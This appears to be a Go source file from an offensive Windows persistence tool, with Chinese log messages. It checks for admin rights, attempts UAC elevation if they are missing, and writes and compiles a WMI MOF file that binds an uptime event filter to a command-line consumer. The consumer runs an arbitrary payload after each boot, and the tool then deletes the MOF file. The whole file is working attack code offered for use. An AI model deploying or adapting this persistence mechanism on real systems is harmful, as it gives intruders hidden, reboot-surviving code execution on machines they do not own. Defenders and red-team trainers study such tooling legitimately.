package persist

import (
	"everHold/src/conf"
	"everHold/src/func/elevate"
	"everHold/src/utils"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"time"
)

func Callmethod2(newcmd *conf.RUNCMD) {
	isAdmin, err := utils.IsUserAnAdmin()
	utils.PrintInfo("正在检查权限...")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	if isAdmin == true {
		wmicMof(newcmd.PayloadValue, newcmd.AddValue, newcmd.NameValue)
	} else {
		utils.PrintError("当前需要权限为：SYSTEM 。权限不足，正在尝试提权...")
		uacLevel, err := utils.GetCurrentUACLevel()
		utils.PrintInfo("当前UAC Level为：" + strconv.FormatUint(uacLevel, 10))
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		if uacLevel == 0 {
			elevate.Runasadmin(newcmd)
		}

	}
	//这里需要判断进行提权

}

func wmicMof(payload string, add bool, name string) {
	if add == true {
		mofTemplate := fmt.Sprintf(`#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")

instance of __EventFilter as $Filt
{
	Name = "%s";
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";
	QueryLanguage = "WQL";    
	EventNamespace = "root\\cimv2";
};

instance of CommandLineEventConsumer as $Cons
{
	Name = "%s";
	RunInteractively=false;
	CommandLineTemplate="%s";
};

instance of __FilterToConsumerBinding
{
	Filter = $Filt;
	Consumer = $Cons;
};`, name, name, payload)

		// Write MOF template to disk
		mofPath := filepath.Join(os.TempDir(), name+".mof")
		mofFile, err := os.Create(mofPath)
		if err != nil {
			utils.PrintError("Cannot proceed, unable to create mof file on disk " + mofPath + "\n")
			return
		}
		defer mofFile.Close()

		_, err = mofFile.WriteString(mofTemplate)
		if err != nil {
			utils.PrintError("Cannot proceed, unable to write mof file to disk " + mofPath + "\n")
			return
		}

		utils.PrintSuccess("Successfully wrote mof template to disk " + mofPath + "\n")
		time.Sleep(5 * time.Second)

		// Disable file system redirection
		//utils.PrintInfo("Disabling file system redirection")
		//oldValue, err := utils.DisableFSR()

		//if err != nil {
		//	utils.PrintError("Failed to disable file system redirection \n" + err.Error())
		//	return
		//}
		//utils.PrintSuccess("Successfully disabled file system redirection")

		// Compile MOF file
		exitCode, success := utils.CreateProcess("mofcomp.exe", mofPath, false, true)
		if success {
			utils.PrintSuccess("Successfully compiled mof file containing our payload " + payload + " exitcode: " + strconv.Itoa(exitCode) + "\n")
			utils.PrintSuccess("Successfully installed persistence, payload will execute after boot")
		} else {
			utils.PrintError("Unable to compile mof file containing our payload " + payload + "\n")
		}
		//err = utils.RevertFSR(oldValue)
		//if err != nil {
		//	fmt.Println("Failed to revert file system redirection:", err)
		//	return
		//}
		// Cleanup
		time.Sleep(5 * time.Second)
		utils.PrintInfo("Cleaning up")
		if err := os.Remove(mofPath); err != nil {
			utils.PrintError("Unable to cleanup" + err.Error())
			return
		}
		utils.PrintSuccess("Successfully cleaned up")

	} else {
		//删除逻辑
		utils.PrintInfo("正在删除...")
	}
}
